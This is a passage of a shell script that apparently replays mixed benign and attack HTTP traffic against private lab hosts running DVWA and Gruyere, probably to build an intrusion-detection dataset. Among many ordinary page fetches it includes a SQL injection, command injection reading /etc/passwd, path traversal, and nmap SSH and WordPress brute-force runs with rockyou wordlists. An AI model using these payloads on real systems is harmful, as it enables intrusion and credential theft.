    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=or+1%3D1%3B&Submit=Submit' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1%3B&Submit=Submit'
sleep 10

# HTTP Remote code execution
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/csrf/' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/exec/'
curl -i -s -k --interface $A1i -X $'POST' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 51' -H $'Origin: http://192.168.56.113' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/exec/' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
    --data-binary $'ip=8.8.8.8+%7C%7C+cat+%2Fetc%2Fpasswd&submit=submit' \
    $'http://192.168.56.113/dvwa/vulnerabilities/exec/'


sleep 20
#Local File Inclusion
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/brute/?username=hello&password=hello&Login=Login' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/fi/?page=include.php'
curl -i -s -k --interface $A1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
    $'http://192.168.56.113/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd'














curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Sun, 06 Aug 2017 05:02:15 GMT' -H $'If-None-Match: \"8ce8-5560ea23d23c0-gzip\"' \
    $'http://lsa/'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/jquery.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/jquery-ui.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/pageable.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/front-end.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/libs/templates/silex-templates/online-service/assets/background_header.jpg'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    $'http://lsa/favicon.ico'


sleep 6




curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/view.php?page=tools.html'


sleep 5

curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Cookie: PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
    $'http://192.168.56.108/phpMyAdmin/'



















curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/gruyere/'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/lib.js'























nmap -n $MSF -e $A3i -S $A3 &
sleep 5
nmap -sV --script=http-enum $MSF -e $A3i -S $A3 &>/dev/null &
sleep 10
nmap -n --script ssh-brute --script-args 'userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $MSF -e $A3i -S A3 &>/dev/null &





















curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Sun, 06 Aug 2017 05:02:15 GMT' -H $'If-None-Match: \"8ce8-5560ea23d23c0-gzip\"' \
    $'http://lsa/'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/jquery.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/jquery-ui.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/pageable.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/Backnode_files/front-end.js'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
    $'http://lsa/libs/templates/silex-templates/online-service/assets/background_header.jpg'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
    $'http://lsa/favicon.ico'




curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
    $'http://192.168.56.108/'
sleep 4
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
    $'http://192.168.56.113/1142014131/login'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newaccount.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
    $'http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/saveprofile?action=new&uid=WisconsinCheddar&pw=potato&is_author=True' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/'


curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet.gtl'

curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/newsnippet2?snippet=Hey+everyone%21%21%21%21'
curl -i -s -k --interface $U1i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=2308874|WisconsinCheddar||author' \
    $'http://192.168.56.113/1142014131/snippets.gtl'







curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'tz_offset=-21600' \
    $'http://192.168.56.113/dvwa/'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/index.php' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/dvwa/js/dvwaPage.js'
curl -i -s -k --interface $U5i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/dvwa/login.php' -H $'Connection: close' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
    $'http://192.168.56.113/dvwa/index.php'





nmap -n -p- $LSA -e $A1i -S A1 &>/dev/null &
sleep 7
nmap -n --script ssh-brute --script-args 'userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $LSA -e $A1i -S A1 &>/dev/null &
sleep 15
nmap -sV --script=http-enum $LSA -e $A1i -S $A1 &>/dev/null &
sleep 30
nmap -n --script http-wordpress-brute --script-args 'http-wordpress-brute.uri=/wordpress/wp-admin,userdb=/usr/share/nmap/nselib/data/users1.lst,passdb=/usr/share/nmap/nselib/data/rockyou1000.lst' $LSA -e $A1i -S $A1 &








curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/jquery/jquery.min.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/bootstrap/js/bootstrap.min.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/scrollreveal/scrollreveal.min.js'
curl -i -s -k --interface $U3i -X $'GET' \
    -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
    -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
    $'http://zc2/vendor/magnific-popup/jquery.magnific-popup.min.js'

curl -i -s -k --interface $U2i -X $'GET' \
    -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'tz_offset=-21600' \
